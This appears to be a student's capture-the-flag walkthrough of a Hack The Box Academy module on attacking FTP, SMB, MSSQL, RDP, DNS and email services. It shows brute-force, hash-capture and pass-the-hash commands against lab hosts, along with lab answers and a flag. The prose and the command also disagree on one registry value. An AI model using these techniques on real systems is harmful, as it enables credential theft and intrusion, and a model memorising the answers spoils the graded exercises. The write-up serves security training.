![](https://academy.hackthebox.com/storage/modules/116/logo.png?t=1738467861)
# Attacking Common Services
Module Summary
Technology enables businesses to be productive using services that help employees be effective, and clients consume what a particular company has to offer. External and internal threats commonly target those services, including emails, websites, databases, file shares, and storage.

As we move forward in this field, we will need to get familiar with common services used by companies and the type of attacks we can execute against those services. Although attacks may be different for every kind of service, we usually pursue common objectives such as:

- The Concept of Attacks
- Finding Sensitive Information
- User Enumeration
- Validating Credentials
- Remote Code Execution
- Privilege Escalation


# Questions and Answers 
## Attacking FTP
* **What port is the FTP service running on?**
  
An initial Nmap scan was conducted using the following command: 
```bash
nmap -sC -sV --top-ports 1000 10.129.203.6
```
This scan, which utilizes default scripts (-sC) and service/version detection (-sV), did not return any open ports. To further investigate, a targeted scan was performed on a specific port range:
```bash
nmap -sC -sV -p 2000-3000 10.129.203.6
```
This scan revealed an FTP server running on port 2121. The absence of results in the initial scan suggests that the service was running on a non-standard port outside the top 1000 most common ports.


[![Screenshot-2025-02-25-120041.png](https://i.postimg.cc/wj4PPG9X/Screenshot-2025-02-25-120041.png)](https://postimg.cc/gxRNL4Xj)

* **What username is available for the FTP server?**

  As discussed in the lecture, misconfigurations can introduce security risks, particularly when services allow anonymous authentication. Certain services, such as FTP, can be configured to permit access without requiring credentials.

After identifying an FTP server running on port 2121 through Nmap scanning, an attempt was made to authenticate using anonymous login:
```bash
ftp -P 2121 anonymous@10.129.203.6
```
This resulted in successful access, confirming that the FTP server allows unauthenticated users to log in.

Then I proceeded to enumerate and download files from the FTP server.

[![Screenshot-2025-02-25-120041.png](https://i.postimg.cc/sDqH4Zmm/Screenshot-2025-02-25-120041.png)](https://postimg.cc/Whm72zQq)


After retrieving users.list and passwords.list from the FTP server, I performed a brute-force attack using Hydra:
```bash
hydra -L users.list -P passwords.list ftp://10.129.203.6:2121 -T 60
```
After executing the Hydra brute-force attack, the following valid FTP credentials were obtained:

* **Username:** robin
* **Password:** 7iz4rnckjsduza7

 [![Screenshot-2025-02-25-134635.png](https://i.postimg.cc/yYqxw7VP/Screenshot-2025-02-25-134635.png)](https://postimg.cc/Th9TbM5L)

 * **Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.**
Using the following command, we attempt to log in via SSH:

```bash
ssh robin@10.129.203.6
```
When prompted, enter the previously discovered password:
```bash
Password: 7iz4rnckjsduza7
```
After successfully logging into the system via SSH, I performed basic enumeration and found a file named flag.txt in the home directory.

[![Screenshot-2025-02-25-135413.png](https://i.postimg.cc/SKXpSzdz/Screenshot-2025-02-25-135413.png)](https://postimg.cc/PLk7KJBt)


# Attacking SMB

* **What is the name of the shared folder with READ permissions?**

To enumerate SMB shares on the target, I used smbmap with the following command:

```bash
smbmap -H 10.129.8.187
```
This provided the following output:

[![Screenshot-2025-02-25-134635.png](https://i.postimg.cc/BvX56JRz/Screenshot-2025-02-25-134635.png)](https://postimg.cc/kVPRYPJN)

**Answer:** GGJ

* **What is the password for the username "jason"?**
To answer this question, I leveraged CrackMapExec to test SMB authentication against the target system. The command used was:
```bash
crackmapexec smb 10.129.8.187 -u jason -p pws.list --local-auth
```
The output shows multiple failed login attempts, but eventually, a valid credential was discovered:

**Username:** jason
**Password:** 34c8zuNBo91!@28Bszh

This credential can now be used for further enumeration or privilege escalation within the target system.


[![Screenshot-2025-02-25-152630.png](https://i.postimg.cc/cC94rGpD/Screenshot-2025-02-25-152630.png)](https://postimg.cc/tn6HMwCP)


* **Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**

Since we now have the correct username and password, we can attempt to SSH into the target system as the jason user. However, when we try, we encounter the following issue:

*jason@10.129.8.187: Permission denied (publickey).*

[![Screenshot-2025-02-25-153410.png](https://i.postimg.cc/6q7Ffs7b/Screenshot-2025-02-25-153410.png)](https://postimg.cc/XBb2nzk9)

While enumerating the SMB shares, I discovered an id_rsa key. To retrieve the key from the GGJ SMB share, I attempted to access it using the following command:

```bash
smbclient \\\\10.129.8.187\\GGJ -U jason
````

[![Screenshot-2025-02-25-154148.png](https://i.postimg.cc/X7LDB7DN/Screenshot-2025-02-25-154148.png)](https://postimg.cc/w7tkSHpn)

Next, I used the command:

```bash
chmod 600 id_rsa
````

After obtaining the id_rsa key, I used the following command to log in via SSH:

```bash
ssh -i id_rsa jason@10.129.8.187
````

I successfully logged into the Ubuntu system and found the flag.txt file. The contents of the file were:
**HTB{SMB_4TT4CKS_2349872359}**

[![Screenshot-2025-02-25-154804.png](https://i.postimg.cc/k5KQ8TXN/Screenshot-2025-02-25-154804.png)](https://postimg.cc/4K4HRbcn)

## Attacking SQL Databases

* *Authenticate to with user "htbdbuser" and password "MSSQLAccess01!"*


* **What is the password for the "mssqlsvc" user?**

  To begin, I performed an Nmap scan using the following command:

```bash 
nmap -sC -sV 10.129.80.163
```
The scan revealed that port 1433 was open, indicating the presence of Microsoft SQL Server 2019.

Next, I connected to the Microsoft SQL Server using the following command:
```bash
sqlcmd -S 10.129.80.163 -U htbdbuser -P MSSQLAccess01!
```
Once connected to the database, I enumerated the available databases by running the following command:
```bash
SELECT name FROM master.dbo.sysdatabases;
GO
```
The output revealed the following databases:
```bash
name
------------------------------------------------------------------
master
tempdb
model
msdb
hmaildb
flagDB
```
The presence of **flagDB** suggests it may contain the flag information.

I tried using the **flagDB** but got the following error message: 

```bash
1> USE flagDB
2> GO
Msg 916, Level 14, State 2, Server WIN-02\SQLEXPRESS, Line 1
The server principal "htbdbuser" is not able to access the database "flagDB" under the current security context.
```

I then tried checking for sysadmin privileges using the command:
```bash
1> SELECT IS_SRVROLEMEMBER('sysadmin');
2> GO
           
-----------
          0

(1 row affected)
```
The result was 0, so the user does not have sysadmin privileges.

In the lecture, you learned how to capture the MSSQL service hash. In the “Attacking SMB” section, we discussed setting up a fake SMB server to steal hashes and exploit default Windows implementations. So I attempted capturing the MSSQL service hash starting by creating a rogue SMB server with: 

```bash
impacket-smbserver SMBShare $(pwd) -smb2support
```

[![Screenshot-2025-02-26-094132.png](https://i.postimg.cc/hvmQwhxT/Screenshot-2025-02-26-094132.png)](https://postimg.cc/CnFKnhcx)


Now, I went back to the MSSQL session and execute it:
```bash
1> EXEC xp_dirtree '\\10.10.14.162\share';
2> GO
```

On the SMB server log we got a response from the MSSQL server

```bash
02/26/2025 08:45:46 AM: INFO: Incoming connection (10.129.80.163,49680)
02/26/2025 08:45:46 AM: INFO: AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
02/26/2025 08:45:46 AM: INFO: User WIN-02\mssqlsvc authenticated successfully
02/26/2025 08:45:46 AM: INFO: mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:42de48b66d93419793e4b2476ec7ae4a:01010000000000000049581e5d88db015b991005c475132500000000010010004a0056005600780077004c0069006f00030010004a0056005600780077004c0069006f000200100059005600780051005800630067006a000400100059005600780051005800630067006a00070008000049581e5d88db0106000400020000000800300030000000000000000000000000300000793650267307fee0832b294b8e754840595f9c72aa3ca1e4f14163b981a229e00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100360032000000000000000000
```

I copied the hash into a file and used John The Ripper to crack it: 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
[![Screenshot-2025-02-26-095259.png](https://i.postimg.cc/wvvhW60Q/Screenshot-2025-02-26-095259.png)](https://postimg.cc/xkwJ8SrX)

*  **Enumerate the "flagDB" database and submit a flag as your answer.**

After acquiring the mssqlsvc password, I proceeded to log into the MSSQL server using those credentials.

```bash
mssqlclient.py -p 1433 -windows-auth mssqlsvc@10.129.80.163
```

Once logged in, I enumerated the available databases using the enum_db command:

```bash
SQL (WIN-02\mssqlsvc guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0   
tempdb                    0   
model                     0   
msdb                      1   
hmaildb                   0   
flagDB                    0   
```

Next, I switched to the flagDB database:

```bash
SQL (WIN-02\mssqlsvc guest@master)> use flagDB
```

Then, I queried the tables within flagDB to find the relevant table:

```bash
SQL (WIN-02\mssqlsvc WINSRV02\mssqlsvc@flagDB)> SELECT name FROM flagDB.sys.tables;
```
The table tb_flag was found. Finally, I retrieved the flag from the tb_flag table:
```bash
SQL (WIN-02\mssqlsvc WINSRV02\mssqlsvc@flagDB)> SELECT * FROM tb_flag;
```

[![Screenshot-2025-02-26-102903.png](https://i.postimg.cc/wT83bqBc/Screenshot-2025-02-26-102903.png)](https://postimg.cc/SjdynpCJ)

## Attacking RDP

*RDP to  with user "htb-rdp" and password "HTBRocks!"*

* **What is the name of the file that was left on the Desktop? (Format example: filename.txt)**

To answer this question, I connected to the host using xfreerdp with the following command:
```bash
xfreerdp /v:10.129.203.13 /u:htb-rdp /p:HTBRocks!
```
Once connected I ccould see the file that was left on the Desktop:

[![Screenshot-2025-02-26-112355.png](https://i.postimg.cc/4xNgdqdh/Screenshot-2025-02-26-112355.png)](https://postimg.cc/WhKKY902)

* **Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**

To allow Pass-the-Hash with the RDP, you need to modify the *DisableRestrictedAdmin* registry key.  Here's the registry path and how you can set it:

- *Registry Key Path:*
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa

- *Registry Key:*
DisableRestrictedAdmin (REG_DWORD)

- *Value:*
Set the value of DisableRestrictedAdmin to 1 to allow Pass-the-Hash.

So I went into the command line and used the command: 

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
[![Screenshot-2025-02-26-113051.png](https://i.postimg.cc/QCyMmDVw/Screenshot-2025-02-26-113051.png)](https://postimg.cc/D41FftrP)

* **Connect via RDP with the Administrator account and submit the flag.txt as you answer.**

I terminated the RDP session for the user htb-rdp and then used the following command in my Linux terminal to connect with the Administrator account using Pass-the-Hash:
```bash
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```
Once connected, I found the flag on the Desktop.

[![Screenshot-2025-02-26-113936.png](https://i.postimg.cc/PfYhF19N/Screenshot-2025-02-26-113936.png)](https://postimg.cc/jCxGDnsr)

## Attacking DNS 
* **Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.**
  
*The hint for this question suggested using Subbrute,* so I proceeded to download it with the following command:

```bash
git clone https://github.com/TheRook/subbrute.git
```

Next, I ran the tool using the command:

```bash
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
```

After some time, I obtained two subdomains:


```bash
inlanefreight.htb
hr.inlanefreight.htb
```
Next, I attempted a zone transfer on hr.inlanefreight.htb using the following command:

```bash
dig AXFR @10.129.75.96 hr.inlanefreight.htb
```

The transfer was successful, revealing the following records:

[![Screenshot-2025-02-26-145648.png](https://i.postimg.cc/pX3QChhW/Screenshot-2025-02-26-145648.png)](https://postimg.cc/8jBrPCm9)

## Attacking Email Services

* **What is the available username for the domain inlanefreight.htb in the SMTP server?**
  
To answer this question, I conducted an Nmap scan using the following command:

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.80.212
```

This scan helped identify the available mail services and their configurations on the target system.

[![Screenshot-2025-02-26-151415.png](https://i.postimg.cc/Z5Kvz69F/Screenshot-2025-02-26-151415.png)](https://postimg.cc/D8HwqJP8)

Next, I used smtp-user-enum to enumerate valid email users on the target system with the following command:

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.80.212
```

[![Screenshot-2025-02-26-151658.png](https://i.postimg.cc/g2JjTd5g/Screenshot-2025-02-26-151658.png)](https://postimg.cc/zVsqLmqh)

This helped me identify the username. 

* **Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.**

I attempted a brute-force attack on the SMTP service using Hydra with the following command:

```bash
hydra -l marlin@inlanefreight.htb -P pws.list -s 25 -f 10.129.80.212 smtp
```
[![Screenshot-2025-02-26-152058.png](https://i.postimg.cc/MTx8gmHz/Screenshot-2025-02-26-152058.png)](https://postimg.cc/bG6Mtb15)

I then connected to the POP3 service on the target machine using Telnet with the following command:

```bash
telnet 10.129.80.212 110
```

Once connected, I logged in as marlin@inlanefreight.htb and provided the password poohbear. After logging in successfully, I listed the available messages using the LIST command, which showed one message of 601 octets. I then retrieved the message with the RETR command.

[![Screenshot-2025-02-26-152709.png](https://i.postimg.cc/8c9XgT4L/Screenshot-2025-02-26-152709.png)](https://postimg.cc/5Q5SwdZt)

The retrieved email contained the following details:

From: marlin@inlanefreight.htb

To: administrator@inlanefreight.htb

Subject: Password change

Date: Wed, 20 Apr 2022

Body:

[![Screenshot-2025-02-26-152532.png](https://i.postimg.cc/GpCNphCQ/Screenshot-2025-02-26-152532.png)](https://postimg.cc/VJK4Gw5r)

## Attacking Common Services - Easy

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

*HTB{...}*
Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

* **You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.**

I began by performing an Nmap scan on the target machine with the following command:

```bash
nmap -sC -sV 10.129.130.131
```
The scan revealed multiple open ports and their associated services:

**Open Ports and Services**
- **Port 21 (FTP):**

Core FTP Server v2.0, build 725 (64-bit, Unregistered)
SSL certificate detected with details:
Common Name (CN): Test
Organization (O): Testing
Location: Florida, US
Valid: 2022 - 2032

- **Port 25 (SMTP - hMailServer)**

Supports authentication via LOGIN and PLAIN methods

- **Port 80 (HTTP - Apache 2.4.53)**

Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Default page: Redirects to /dashboard/
Possible Web Application: XAMPP
Port 443 (HTTPS - Unidentified Service)

Requires basic authentication (401 Unauthorized)

- **Port 587 (SMTP - hMailServer)**

Same authentication methods as port 25

- **Port 3306 (MySQL - MariaDB 10.4.24)**

Authentication Plugin: mysql_native_password
Status: Autocommit enabled

- **Port 3389 (RDP - Microsoft Terminal Services)**

Target Hostname: WIN-EASY
Windows Version: 10.0.17763
SSL Certificate: Valid from Feb 26, 2025, to Aug 28, 2025
